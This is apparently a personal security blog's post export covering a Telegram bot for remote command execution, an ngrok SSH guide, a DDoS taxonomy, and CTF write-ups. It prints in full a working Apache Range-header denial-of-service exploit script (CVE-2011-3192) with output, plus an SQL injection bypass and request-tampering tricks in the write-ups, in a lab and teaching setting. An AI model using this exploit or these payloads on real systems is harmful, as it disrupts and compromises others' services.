
            
        
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        
        
        
        
        
        
        
        
        
        
        
            
        
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        
            
        
        [{"categories":[],"content":"This project is about a Telegram bot with the ability to execute terminal commands from your Telegram account and with the command response as messages.\nInitially, I started this project for personal needs, but I decided to release it because of the sure need of many with the same problem. I encountered and based in a project of Va5c0 .\nIt often happens in a pentest or even more a bug bounty, that you need to enumerate targets or processes that take a lot of time as certain types of nmap scans, cracking some hash. And many times for that reason I leave that process working, checking if it is finished or not, leaving the computer on, sometimes with nothing else to do, sometimes I had to leave and turn off the computer leaving all the previous process without results. It is a high cost of time and money.\nSo now I share this little project of a bot (which I baptized as Bot Bounty) that can be used by a single person or several, as a company with this same need to improve productivity. Either on a computer, VPS, or a Raspberry. Keeping the degree of security that no one but the people who are authorized to use the bot will use it (in case someone external comes across the bot and try to use it).\nThe bot has predefined options for quick access to information that can be useful for bot usage. To mention a few: the available RAM space (info serv/RAM option), or the public IP of the device on which the bot is running.\nIn addition, with the command /exec you can execute any command that is available in our terminal of the device to use, for example:\nThus limiting itself to commands that require interaction, such as some unforced installation with the typical -y or logging in via SSH, to name a few examples.\nFor example, in amass, the command is /amassenum, which calls $ amass enum -d to perform an enumeration of subdomains:\nIn nmap we have a scan with the scripts, by default, pull out the port versions found, avoid performing host discovery (check if it is alive), and search all possible ports; i.e.: $ nmap -sC -sV -Pn -p-.\nOf course, to use these commands, the tools must be installed in the system you are using to run the bot (and you can call them directly in the console).\nAs a first release, we only have these commands; however, I am waiting for other shortcut commands to add to the bot that you suggest. Also, if you find bugs, you can write to me or issue an issue in the repository.\nThe repository is as follows: Bot Bounty Pre-configurations To use it previously you must create a bot in Telegram and replace the API KEY that gives by the value specified in the script at line 12.\nTOKEN = \u0026#39;XXXXXX:XXXXXXXXXXXXXXXXXXXXXXXX\u0026#39;. In addition to register the user ID(s) that will use the bot, in line 14:\nauthorizedUsers = [123456789, 987654321] And now just run the script.\n$ python3 bot.py Tips **If the command\u0026rsquo;s output is too big, you should save it in a file and without output **.\nfor example:\nnmapadv example.com \u0026gt; resultsExample.txt nmapadv example.com -oN resultsExample.txt exec echo 'awesome bot!' \u0026gt; yesItIs.txt To check for possible unauthorized users trying to use the bot, a log of all executed commands with user details is kept in the file logFileBot.txt.\nAnd that would be it, for now; I hope this work is well received.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/post/bot-bounty-telegram-bot/","tags":[{"LinkTitle":"Bot","RelPermalink":"/tags/bot/"},{"LinkTitle":"Featured","RelPermalink":"/tags/featured/"},{"LinkTitle":"Bug Bounty","RelPermalink":"/tags/bug-bounty/"},{"LinkTitle":"Pentest","RelPermalink":"/tags/pentest/"},{"LinkTitle":"Tool","RelPermalink":"/tags/tool/"}],"title":"Bot Bounty, a bot for Pentesting \u0026 Bug Bounty"},{"categories":[],"content":"I\u0026rsquo;ve been into cybersecurity for over for over 10 years, driven by the belief that improving information security isn\u0026rsquo;t a cost ‚Äî it\u0026rsquo;s an essential investment for any society.\nCurrently, I‚Äôm a cybersecurity consultant at a Swiss company, where I focus on red teaming, offensive and defensive security assessments, and incident response for companies, banks, and critical infrastructure.\nOver the years, I‚Äôve had the chance to be a speaker, trainer, and mentor at various events and organizations. I‚Äôve also received multiple awards and recognitions in bug bounty programs and other cybersecurity areas.\nI hold professional certifications and specialized training from institutions like INE, EC-COUNCIL, Google, and CISCO. I also contribute voluntarily by helping assess the security of government websites.\nMy expertise lies in Web Security Testing and Penetration Testing. I‚Äôve built custom tools and led projects with a practical, results-driven approach to information security.\nIf you think I can help you out or you\u0026rsquo;d like to collaborate on something security-related, feel free to message me on social media ‚Äî just tell me what you need.\nAnd if you enjoy my work or want to support what I do, you can always Buy Me a Beer! üç∫üòâ\nüç∫Buy me a Beer ","permalink":"https://drayko.github.io/about/","tags":[],"title":"About Drayko"},{"categories":[],"content":"This post arose from a university job (for a Raspberry); however, it served me with other similar needs, to connect remotely without opening ports on the router.\nTo achieve an SSH connection (or another protocol) outside the local area, in a simple way, it seems this, for different reasons (it could be by enabling ports on the router, only that this according to the operator can become very difficult to achieve due to your policies among other things), then let\u0026rsquo;s continue, you need to install Ngrok In the case of a Raspberry you need the version Linux(ARM) or in console:\nwget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip Then the unzip is done as explained in the ngrok console tutorial:\nunzip ngrok-stable-linux-arm.zip The next thing is to register and/or enter ngrok, and once there, go to this link where it will show the token for your account\nOnce knowing your token you have to execute on your device:\n./ngrok authtoken XXXXXHereYourTokenXXXXXXX With that it should be configured, all that remains is to listen to port 22, which is used by SSH, as follows:\n./ngrok tcp 22 it is then when it shows them the Host and port it will point This shows at Forwarding the TCP address and port that enables us to work with our Raspberry.\nIn this case, it was 0.tcp.ngrok.io and port 17271, that is, instead of our local IP and default port (22), these must be specified to access our device outside the local area, that is:\nssh pi@0.tcp.ngrok.io -p17271 and that would be :D On the ngrok page you can review the variety and protocols available, with the same logic.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/post/ssh-connection-outside-the-local-network/","tags":[{"LinkTitle":"Redes","RelPermalink":"/tags/redes/"},{"LinkTitle":"SSH","RelPermalink":"/tags/ssh/"},{"LinkTitle":"Network","RelPermalink":"/tags/network/"},{"LinkTitle":"Ngrok","RelPermalink":"/tags/ngrok/"}],"title":"SSH connection outside the local network"},{"categories":[],"content":" A Distributed Denial of Service (DDoS) attack is carried out by generating a large flow of information from multiple connection points towards a single destination. In this post, two types of taxonomies will be presented to classify them by attacks and countermeasures, highlighting similarities, characteristics, and strategies with the aim of designing appropriate measures.\nIntroduction\nThe development and use of DDoS attack techniques have increased over time, and attackers constantly modify their approaches. This study aims to cover both well-known attacks and potential modifications, divided by levels.\nGeneral Aspects\nWhat makes DDoS attacks possible?\nDue to the design of the Internet following an end-to-end paradigm, in a two-way communication there is no intermediary that can immediately control or stop the transmission of malicious packets. Additionally, the possibility of performing IP Spoofing further complicates controlling these attacks without affecting genuine clients of the victim host.\nHow are DDoS attacks carried out?\nTo begin, they consist of several phases. Usually, automated scanning is used to identify devices that may be vulnerable‚Äîin simple terms, this is the start of the recruitment process. Once identified, these devices are exploited or infected (typically automatically) to introduce malicious code, which will later be used to recruit even more devices. I would call this a pyramid scheme.\nWhy are DDoS attacks carried out?\nThey are usually executed for personal reasons (revenge) or reputation (to gain respect and fame). However, they are also carried out for economic reasons (to harm a competitor) and political reasons (such as a war that could leave an entire country without internet services‚Äîan issue that Russia recently considered and is working on by improving its internet independence and implementing countermeasures).\nTaxonomy of DDoS Attacks\nDA: Degree of Automation (Grado de automatizaci√≥n)\nDA-1 Manual\nThe previously mentioned phases of scanning and exploitation are carried out entirely manually by the attacker.\nDA-2 Semi-Automatic\n\u0026hellip;\nTaxonomy of DDoS Defense Mechanisms\nFor more details on each classification, refer to this article .\nDemo Time | CVE-2011-3192 To provide a practical example of a DDoS attack, consider the case study of the so-called ApacheKiller attack. This attack allows adversaries to cause a denial of service (through memory and CPU consumption) by exploiting the Range header that specifies multiple overlapping ranges, and it is assigned the identifier CVE-2011-3192.\nAffected versions of Apache HTTP Server include 1.3.x, 2.0.x up to 2.0.64, and 2.2.x up to 2.2.19. In my case, I used Windows 7 as the victim host running Apache v2.2.15 along with a Python script to execute the attack.\nStep 1\nInstall and run a vulnerable version of Apache as described above. Step 2\nPerform a brief test so you can closely observe the request, which also reveals the version of Apache in use. In a paid test or bug bounty scenario, this information could be very useful. Step 3\nUsing the Python script created by Miroslav Stampar, we perform the test:\n#!/usr/bin/env python import optparse, os, re, socket, threading, time, urllib, urllib2, urlparse NAME = \u0026#34;KillApachePy (Range Header DoS CVE-2011-3192)\u0026#34; VERSION = \u0026#34;0.1c\u0026#34; AUTHOR = \u0026#34;Miroslav Stampar (@stamparm)\u0026#34; LICENSE = \u0026#34;Public domain (FREE)\u0026#34; SHORT = \u0026#34;You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better\u0026#34; REFERENCE = \u0026#34;http://seclists.org/fulldisclosure/2011/Aug/175\u0026#34; SLEEP_TIME = 3 # time to wait for new thread slots (after max number reached) RANGE_NUMBER = 1024 # number of range subitems forming the DoS payload USER_AGENT = \u0026#34;KillApachePy (%s)\u0026#34; % VERSION def attack(url, user_agent=None, method=\u0026#39;GET\u0026#39;, proxy=None): if \u0026#39;://\u0026#39; not in url: url = \u0026#34;http://%s\u0026#34; % url host = urlparse.urlparse(url).netloc user_agent = user_agent or USER_AGENT if proxy and not re.match(\u0026#39;\\Ahttp(s)?://[^:]+:[0-9]+(/)?\\Z\u0026#39;, proxy, re.I): print \u0026#34;(x) Invalid proxy address used\u0026#34; exit(-1) proxy_support = urllib2.ProxyHandler({\u0026#39;http\u0026#39;: proxy} if proxy else {}) opener = urllib2.build_opener(proxy_support) urllib2.install_opener(opener) class _MethodRequest(urllib2.Request): \u0026#39;\u0026#39;\u0026#39; Create any HTTP (e.g. HEAD/PUT/DELETE) request type with urllib2 \u0026#39;\u0026#39;\u0026#39; def set_method(self, method): self.method = method.upper() def get_method(self): return getattr(self, \u0026#39;method\u0026#39;, urllib2.Request.get_method(self)) def _send(check=False): \u0026#39;\u0026#39;\u0026#39; Send the vulnerable request to the target \u0026#39;\u0026#39;\u0026#39; if check: print \u0026#34;(i) Checking target for vulnerability...\u0026#34; payload = \u0026#34;bytes=0-,%s\u0026#34; % \u0026#34;,\u0026#34;.join(\u0026#34;5-%d\u0026#34; % item for item in xrange(1, RANGE_NUMBER)) try: headers = { \u0026#39;Host\u0026#39;: host, \u0026#39;User-Agent\u0026#39;: USER_AGENT, \u0026#39;Range\u0026#39;: payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39; } req = _MethodRequest(url, None, headers) req.set_method(method) response = urllib2.urlopen(req) if check: return response and (\u0026#39;byteranges\u0026#39; in repr(response.headers.headers) or response.code == 206) except urllib2.URLError, msg: if \u0026#39;timed out\u0026#39; in str(msg): print \u0026#34;\\r(i) Server seems to be choked (\u0026#39;%s\u0026#39;)\u0026#34; % msg else: print \u0026#34;(x) Connection error (\u0026#39;%s\u0026#39;)\u0026#34; % msg if check or \u0026#39;Forbidden\u0026#39; in str(msg): os._exit(-1) except Exception, msg: raise try: if not _send(check=True): print \u0026#34;(x) Target does not seem to be vulnerable\u0026#34; else: print \u0026#34;(o) Target seems to be vulnerable\\n\u0026#34; quit = False while not quit: threads = [] print \u0026#34;(i) Creating new threads...\u0026#34; try: while True: thread = threading.Thread(target=_send) thread.start() threads.append(thread) except KeyboardInterrupt: quit = True raise except Exception, msg: if \u0026#39;new thread\u0026#39; in str(msg): print \u0026#34;(i) Maximum number of new threads created (%d)\u0026#34; % len(threads) else: print \u0026#34;(x) Exception occured (\u0026#39;%s\u0026#39;)\u0026#34; % msg finally: if not quit: print \u0026#34;(o) Waiting for %d seconds to acquire new threads\u0026#34; % SLEEP_TIME time.sleep(SLEEP_TIME) print except KeyboardInterrupt: print \u0026#34;\\r(x) Ctrl-C was pressed\u0026#34; os._exit(1) def main(): print \u0026#34;%s #v%s\\n by: %s\\n\\n(Note(s): %s)\\n\u0026#34; % (NAME, VERSION, AUTHOR, SHORT) parser = optparse.OptionParser(version=VERSION) parser.add_option(\u0026#34;-u\u0026#34;, dest=\u0026#34;url\u0026#34;, help=\u0026#34;Target url (e.g. \\\u0026#34;http://www.target.com/index.php\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--agent\u0026#34;, dest=\u0026#34;agent\u0026#34;, help=\u0026#34;User agent (e.g. \\\u0026#34;Mozilla/5.0 (Linux)\\\u0026#34;)\u0026#34;) parser.add_option(\u0026#34;--method\u0026#34;, dest=\u0026#34;method\u0026#34;, default=\u0026#39;GET\u0026#39;, help=\u0026#34;HTTP method used (default: GET)\u0026#34;) parser.add_option(\u0026#34;--proxy\u0026#34;, dest=\u0026#34;proxy\u0026#34;, help=\u0026#34;Proxy (e.g. \\\u0026#34;http://127.0.0.1:8118\\\u0026#34;)\u0026#34;) options, _ = parser.parse_args() if options.url: result = attack(options.url, options.agent, options.method, options.proxy) else: parser.print_help() if __name__ == \u0026#34;__main__\u0026#34;: main() And configuring it with the Burp Suite proxy, the terminal output would look something like this:\nroot@lab:~# python Apachekiller.py -u 192.168.100.58 --proxy=\u0026#34;http://127.0.0.1:8080\u0026#34; KillApachePy (Range Header DoS CVE-2011-3192) #v0.1c by: Miroslav Stampar (@stamparm) (Note(s): You\u0026#39;ll typically have to wait for 10-20 iterations before first connection timeouts. More complex/bigger the page the better) (i) Checking target for vulnerability... (o) Target seems to be vulnerable (1) Creating new threads Once executed, let\u0026rsquo;s check our server: As you can see, the CPU usage is maxed out, which demonstrates the vulnerability these Apache versions have. However, let\u0026rsquo;s analyze the requests that were sent. As you can see, requests are sent with overlapping ranges, causing our server to process all this data for an extended period (thus consuming resources), which, on a larger scale, can be fatal. Thus, this is an example of a DoS attack that managed to achieve 100% CPU usage. With a simultaneous attack from multiple machines (a DDoS attack), it could potentially crash the server (resulting in a blue screen).\nThis would be an example in our taxonomy of an EW-1 (Exploited Weakness to Deny Services: Semantic), as the attack exploits a bug present in these versions of Apache.\nA solution to this problem would be to update the server and/or apply patches if available, as well as implement a WAF like modSecurity. Therefore, the taxonomy for our DDoS defense mechanism would be AL-1:PG-1:ST-1 (Activity Level: Preventive - Prevention Goal: Attack Prevention - Secured Target: System Security).\nThat‚Äôs it‚Äîif you have any questions, feel free to reach out.\n-Hackers are People Too üòú\n","permalink":"https://drayko.github.io/post/taxonomy-of-ddos/","tags":[{"LinkTitle":"Networks","RelPermalink":"/tags/networks/"},{"LinkTitle":"Curiosities","RelPermalink":"/tags/curiosities/"},{"LinkTitle":"Network","RelPermalink":"/tags/network/"},{"LinkTitle":"Paper","RelPermalink":"/tags/paper/"}],"title":"Taxonomy of DDoS Attacks and DDoS Defense Mechanisms"},{"categories":[],"content":"Although this post is not something technical as usual, I find it quite interesting about the first computer in Bolivia.\nSomeone sent on the mailing list of the Free Software Community of Bolivia a link to a post in medium . Where some of the documented articles about the first computers in each country were listed, and discovering that Bolivia was on that list was interesting (the paper is among the ACM library).\nThe first computer, according to this article, is a IBM 1440 (as seen in the image), which the Bolivian Mining Corporation acquired (COMIBOL).\nThe article was published in 1969. It explains that the department created to use the machine had already been in operation for 3.5 years. So I deduce that the computer arrived in 1965 or 1966 (if anyone could confirm this, it would be incredible).\nHowever, the complicated thing at the beginning, as in almost any new equipment, was to find trained workers to use this machine. That was available for the accounting processes of the corporation, something that questioned the usefulness given the cost of the computer. So aptitude tests were made for its management, where 500 people applied, but only six passed. They sent these staff to be trained in COBOL and FORTRAN IV to do the data processing.\nAlthough it was a tremendous technological advance, there were still doubts about it and being criticized because the previous staff who carried out this accounting work by hand had to be practically fired.\nThe cost of technological advancement for specific jobs or careers continues to be devastating to this day due to the automation of processes and even more so when using \u0026ldquo;Artificial Intelligence\u0026rdquo; is already seen in so many areas that the human seems unnecessary.\nHowever, it is not the end of the road for everyone; it is the law of life and nature that the strongest or the one who adapts the fastest survives. In this case, being hand in hand with technology, you don\u0026rsquo;t have to give up.\n-Hackers are People Too\n","permalink":"https://drayko.github.io/post/the-first-computer-in-bolivia/","tags":[{"LinkTitle":"Curiosities","RelPermalink":"/tags/curiosities/"},{"LinkTitle":"Fun Facts","RelPermalink":"/tags/fun-facts/"}],"title":"The first computer in Bolivia"},{"categories":[],"content":"This CTF was composed of 74 teams from universities convened nationally for undergraduate and graduate level at the International Congress Of Computer Security (CIDSI in Spanish) which was organized by the Agency of Electronic Government and Information and Communication Technologies (AGETIC in Spanish). Thanks to the efforts of the Computer Incident Management Center(CGII) held from November 29 to December 1, 2018.\nFinishing this series, and as I mentioned in the previous post , in this one we participated in Team as Dark Army with Israel , Rafael and my person , accomplishing to solve all the challenges; However we could not recover all the statements or the specific flags(As they were written in literal form in the event), but they are explained as we solved it in the CTF, which lasted two half days.\nLevel 1 1.1. Traffic Analysis 1 Welcome. A company dedicated to banking has just hired you to perform traffic analysis. The problem is that there is an employee who is leaking email addresses, at the same time another employee started to pass passwords that have privileges to modify the salaries of employees. Your mission is to find that password.\nWell, to begin with, they give us a traffic capture , in which when we search with Wireshark we find a request with the username and password.\nthen the flag is:\n007 1.2 Web crawlers Unfortunately search engines are indexing many pages of this website that are confidential to us! Do you know which file prevents this from happening? Nobody wants fully indexed sites right?\nThis is quite easy, the Flag is inside the robots.txt , which provides information to the search engine crawlers about the pages or files that they can request or not from your website.\nhttp://url/robots.txt 1.3 Backups Petr√≥leos del Caribe asked us to save a backup of its main jsp file. Unfortunately, the engineer in charge went to a plant in the middle of the sea and he can\u0026rsquo;t tell us the extension with which he saved them. The supply manager requires the backup urgently, can you help me identify which file it is in? Do it soon my position is at stake. Remember that the most common backup extensions are:\nbak old bakup save In this one we had to be somewhat observant, as much in the track as in what we have in front of us, it tells us the main jsp, which would come to mean the index.jsp in addition that the current page is http://url/index.jsp.\nSo trying with the extensions that they suggest us, it is possible to arrive to the answer\nhttp://url/index.jsp.bakup Which contains\n\u0026lt;%@ page contentType=\u0026#34;text/html; charset=UTF-8\u0026#34; pageEncoding=\u0026#34;UTF-8\u0026#34; language=\u0026#34;java\u0026#34; import=\u0026#34;java.sql.*,java.io.*,java.net.*,org.owasp.encoder.Encode, dbProcs.*, utils.*\u0026#34; errorPage=\u0026#34;\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Locale\u0026#34;%\u0026gt; \u0026lt;%@ include file=\u0026#34;translation.jsp\u0026#34; %\u0026gt; \u0026lt;% ShepherdLogManager.logEvent(request.getRemoteAddr(), request.getHeader(\u0026#34;X-Forwarded-For\u0026#34;), \u0026#34;DEBUG: index.jsp *************************\u0026#34;); Locale lang = new Locale(Validate.validateLanguage(request.getSession())); /** The flag/flag is: 402051f4be0cc3aad33bcf3ac3d6532b. */ %\u0026gt; then that\u0026rsquo;s where we get the flag\n402051f4be0cc3aad33bcf3ac3d6532b 1.4 Programmer program One of your friends left you a clue in java code development, but you must solve a mathematical puzzle before you can find the result. The flag is the key to enter his system (the smallest number you can find). But this is easy for you, they are not differential equations.\ngive us a java file\npackage exploit; import java.util.Scanner; public class KeithLikesToTroll { public static void main(String[] args){ int clave; Scanner scn = new Scanner(System.in); System.out.print(\u0026#34;Introdusca la llave: \u0026#34;); clave = scn.nextInt(); scn.close(); if(1338557220 / clave * clave != 1338557220 \u0026amp;\u0026amp; clave \u0026gt; 0){ System.out.println(\u0026#34;Autenticacion correcta. La bandera es un n√∫mero peque√±o que te dejara entrar.\u0026#34;); }else{ System.out.println(\u0026#34;Autenticacion incorrecta.\u0026#34;); } } } Which should be compiled and executed in such a way that the lowest number of correct, with brute force can be reached quickly.\nThe Flag:\n8 1.5 Wifi admin panel We are on vacation in the Caribbean, unfortunately, because of your friend the flight has just left us and we are waiting for 5 long hours at the airport. Another one of your friends found out that they can access free internet at the airport but to do so you must log in to the router. Do you dare to try how to log in?\nFor this, we need to observe well, and the clue they give us is SMC Networks, which is a brand that produces Routers among other things, which with a little search we have some combinations of Users and Passwords by default which we try to find the correct and get the flag\nLevel 2 2.1 Steganography Did you know that the technique of hiding messages or objects inside images so that their existence is not perceived is steganography. We love this technique. So I will leave this image here and go very slowly.\nimage to download This at first puzzled us, however, the solution is to extract each printable string in the image, using strings from console(on Linux) strings 8c373fd1a.jpeg And the Flag:\n1e5b77443345620c52d23c73dc87521c 2.2 Forensics A dangerous criminal is passing hidden messages in pdfs sent by his accomplice abroad. You can do an analysis, you\u0026rsquo;re almost a hacker. Did you find your flag?Download document In this case, parsing the metadata gives us the spoils; With the use of Exiftool :\nexiftool CIDSI2018.pdf And the Flag:\nc47d187067c6cf9 2.3 SQL Injection We know that the coyote buys all his artifacts from ACME, can you help us display all the tuples in the table to find the trap with which he finally catches his nemesis?\nWhen I saw this one I thought it would take a while, however when I tried any injection a copy of the query I made appeared at the top, very Bricks style. So finding the solution was very quick with a typical bypass injection.\n\u0026#39;)or(\u0026#39;1\u0026#39;)=(\u0026#39;1 Which gave us the Flag.\n2.4 Reverse Engineering One of the biggest dangers in mobile applications is reverse engineering. Because we can inspect the source code and find API keys, passwords, etc. We found an apk file while you were checking shared resources, luckily we saved it, now we want to know what it contains. There are several tools available to reverse engineer an APK file.Download APK As mentioned in the statement, there are several tools, I preferred to use Apktool apktool d reversing.apk which gives us a folder with everything extracted, in which you can do a quick search with grep user@pc:# grep \u0026#34;flag\u0026#34; . -R ./reversing/smali/com/mobshep/reverseengineer/Reverse_Engineering.smali: const-string v0, \u0026#34;The flag/flag is 9yfdsj3md0lq75\u0026#34; and the Flag!\n9yfdsj3md0lq75 Level 3 3.1 Traffic analysis 2. We are performing a traffic analysis because we detected that someone is leaking confidential information and the amount of information is so large that they compressed it with password protection, but finding the password is easy for you. Help us to find the password that will help us to access our flag.Download capture Finding the zip was not difficult, we only had to export it with Export Packet Bytes or exporting all the objects. Once arrived at this point the zip that we obtain is protected with a password as mentioned in the statement, for that, we had to observe the capture\nthe zip password\nazulcrema and the flag!\nIW{HTTP_BASIC_AUTH_IS_EASY} 3.2 User list A group of users decided to complain because there is no coffee, can you believe it. And one of the users seems to be the one stealing the coffee, of course, he hid himself from the list. Help me find him and bring back the coffee to our lives.\nIn this one it took me a while to realize, we were given a choice between consulting the information of 5 users, however, there was not something relevant among them, I tried to search by inspecting the elements, and the requests, however, the clue was in how the requests were made.\nPOST /challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646e0f313a4 HTTP/1.1 Host: 192.168.3.100 Accept: ** Accept-Language: en-US,en:q-0.5 Accept-Encoding: gzip, deflate Referer: https://192.168.3.100/challenges/vc9b78627df2c032ceaf7375df1d847e47ed7abac2a4ce4cb6086646eOf313a4.jsp Content-Type: application/X-WWW-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 45 Connection: close userId%5B%5D=cfcd208495d565ef66e7dff9f98764da The request was identified this way: cfcd208495d565ef66e7dff9f98764da, which when verified was an MD5 and in plain text value 0:\ncfcd208495d565ef66e7dff9f98764da = 0 When checking the others, they worked the same way, so I generated a list of MD5 hashed numbers to make requests until I found the hidden user, which was no more than the number 20.\n3.3 HASHDUMP Find the admin password\nsistemas:500:9E689B23C4D33D88E4C560258374B547:7E058F739B8A1E67C00815FC1E5E0E25::: Guest:501:NO PASSWORD*********************:NO PASSWORD*********************::: nonadmin:1005:NO PASSWORD*********************:0CF3760C0B0EB9F570AACE7040DF6DB7::: contabilidad:1013:23AC1B85C36D31AAE45E0AE1804A24B0:DE6D8B1780A4F0714242AC53A6C2B2E8::: administrador:1014:CE9F401800DF01AFFF959C003A9671D0:A7B9ECDD64AA492E449E0A619FD16E4B::: gerencia:1015:4978646A5C99C2834D6A97A372D4BC83:C7994B298128024418AD0E9C5038570C::: We can see that it is a dump of the Windows (NTLM) hashes.\nThis one took a while to figure out the trick, at first glance one would think that the admin account would be the one with such a name or similar, however, the trick was in the RID . The 500 belongs to the administrator account created during the OS installation, although in this case it is called sistemas.\nThen we have 2 ways to find it by brute force/dictionary or to look for it, to save time better to look for it and so we have, the flag!\ncoldplay Level 4 4.1 Cracking rar The users of the insurance company SEGURITAS are driving the systems staff crazy with their famous changes. As if they were going to change the world. If you are clever you will be able to access the flag that is compressed and password protected A systems employee has a clue for you. His id from a popular social network is 0x5afa18273c14.\nDownload First the id must be converted from Hexadecimal, then we get: 100030193548308.\nNow in facebook, we look for the profile: https://www.facebook.com/100030193548308 in which we find pictures of the employee spreading critical information about the company like that for rar files the password must have a number of length 5, then the only thing left is to crack the rar with a dictionary with all the possibilities of 5 digits numerals with John The Ripper .\njohn --wordlist=six --format=rar5 hashrar hashrar is the file where the hash of the RAR is located, then, we have the password.\n60372 With this we can extract the flag inside the archive:\n8743b52063cd84097a65d1633f5c74f5 4.2 Website bank To complete this challenge you must create a bank account and transfer more than 10000 bs to it. When you have that amount in your bank account, simply log out and log in again to be rewarded with the flag.\nTo start with you have to register, and the platform gives us the possibility to transfer money to other accounts\nHowever intercepting the requests was insecure, similar to this:\naccountSource=4\u0026amp;accountDestination=2\u0026amp;amount=1200 so by modifying the request, we can reverse this\naccountSource=2\u0026amp;accountTarget=4\u0026amp;amount=1200 this way we transfer money to ourselves, here is the result:\nVoila!\n0738FF78AE98A11F579A70F3F98468097426D4652B32A5F978818FC9CCB66CE74371A28833CC1A52854697C734D66249DB8E9AAB67F024262436EC8220C9OF11 Level 5 5.1 Exploiting We are doing safe development, Your challenge is to change the flow of the program so that the hidden function executes. Once you succeed I will congratulate you on your success. The flag is the hexadecimal address of the function beat with the correct format (0x11223344)Download program For this one, we had to use IdaPro , and look for the address.\n0x080484BB And that would be it!\nHowever we could not take 1st place by six points, because those who solved a challenge first had extra points, but we were very happy with the great team we formed; being in 2nd place among so many teams.\nAny doubt, question, or complaint you can write me , I hope you liked the WriteUp.\n-Hackers are People Too üòú\nlinks of interest Full undergraduate/postgraduate standings, click here the challenges were the same for both grades\nTo view event information here series links CTF UMSS WriteUp WirteUp Demo CTF CTF CIDSI 2018 ","permalink":"https://drayko.github.io/post/writeup-cidsi18/","tags":[{"LinkTitle":"CTF","RelPermalink":"/tags/ctf/"},{"LinkTitle":"WriteUp","RelPermalink":"/tags/writeup/"},{"LinkTitle":"Featured","RelPermalink":"/tags/featured/"}],"title":"WriteUp CTF CIDSI 2018"},{"categories":[],"content":"This is the second part of the series of CTFs heading to CIDSI 2018. This time the CTF was held at the Universidad Mayor de San Sim√≥n (UMSS), a way of qualifying for those who would go to the event (CIDSI) representing our university.\nThis CTF was organized by the Scientific Society of Students of Systems and Informatics (SCESI -UMSS) with the support of the Headquarters of Careers of Informatics and Systems of the University Mayor of San Sim√≥n (UMSS). In addition to @crhystamil made the challenges, thank you very much for such good challenges!\nIt was hosted on the FBCTF platform , and we participated as a team as Dark Army with Israel , Rafael and my person , achieving 1st place, without further ado, let\u0026rsquo;s get started!\n1.- problema:ZmxhZ3tVTVNTX2VkdV9TY2VzaV9DdGZ9Cg==\nsolution: Something simple to start with, as we can see, the solution is in Base64\nThe flag is:\nflag{UMSS_edu_Scesi_Ctf} 2.- Be very observant and find the flag for this challenge.\nsolution: Well, in the problem it gives us a login: We could try more than one way to bypass the login, but first let\u0026rsquo;s review the source code, it shows us that the login is being verified with Javascript:\nvar _0x9045=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x45\\x48\\x43\u0026#34;,\u0026#34;\\x4D\\x33\\x52\\x6F\\x61\\x57\\x4D\\x30\\x62\\x46\\x39\\x6F\\x4E\\x47\\x4E\\x72\\x4D\\x57\\x35\\x6E\u0026#34;,\u0026#34;\\x46\\x4C\\x41\\x47\\x20\\x65\\x6E\\x63\\x6F\\x6E\\x74\\x72\\x61\\x64\\x61\\x21\\x21\\x2C\\x20\\x69\\x6E\\x67\\x72\\x65\\x73\\x61\\x20\\x65\\x6C\\x20\\x66\\x6C\\x61\\x67\\x20\\x65\\x6E\\x20\\x65\\x6C\\x20\\x66\\x6F\\x72\\x6D\\x61\\x74\\x6F\\x20\\x66\\x6C\\x61\\x67\\x7B\\x2E\\x2E\\x2E\\x2E\\x7D\u0026#34;,\u0026#34;\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\u0026#34;,\u0026#34;\\x69\\x6E\\x64\\x65\\x78\\x2E\\x68\\x74\\x6D\\x6C\u0026#34;,\u0026#34;\\x59\\x6F\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x6C\\x65\\x66\\x74\\x20\u0026#34;,\u0026#34;\\x20\\x61\\x74\\x74\\x65\\x6D\\x70\\x74\\x3B\u0026#34;,\u0026#34;\\x64\\x69\\x73\\x61\\x62\\x6C\\x65\\x64\u0026#34;,\u0026#34;\\x73\\x75\\x62\\x6D\\x69\\x74\u0026#34;];var attempt=3;function validate(){var _0xd22bx3=document[_0x9045[2]](_0x9045[1])[_0x9045[0]];var _0xd22bx4=document[_0x9045[2]](_0x9045[3])[_0x9045[0]];if(_0xd22bx3== _0x9045[4]\u0026amp;\u0026amp; _0xd22bx4== atob(_0x9045[5])){alert(_0x9045[6]);window[_0x9045[7]]= _0x9045[8];return false}else {attempt--;alert(_0x9045[9]+ attempt+ _0x9045[10]);if(attempt== 0){document[_0x9045[2]](_0x9045[1])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[3])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[12])[_0x9045[11]]= true;return false}}} However it is obfuscated, we can search many sites online to plain it and have it more understandable:\nvar attempt = 3; function validate() { var _0xd22bx3 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;value\u0026#39;]; var _0xd22bx4 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;value\u0026#39;]; if (_0xd22bx3 == \u0026#39;EHC\u0026#39; \u0026amp;\u0026amp; _0xd22bx4 == atob(\u0026#39;M3RoaWM0bF9oNGNrMW5n\u0026#39;)) { alert(\u0026#39;FLAG encontrada!!, ingresa el flag en el formato flag{....}\u0026#39;); window[\u0026#39;location\u0026#39;] = \u0026#39;index.html\u0026#39;; return false } else { attempt--; alert(\u0026#39;You have left \u0026#39; + attempt 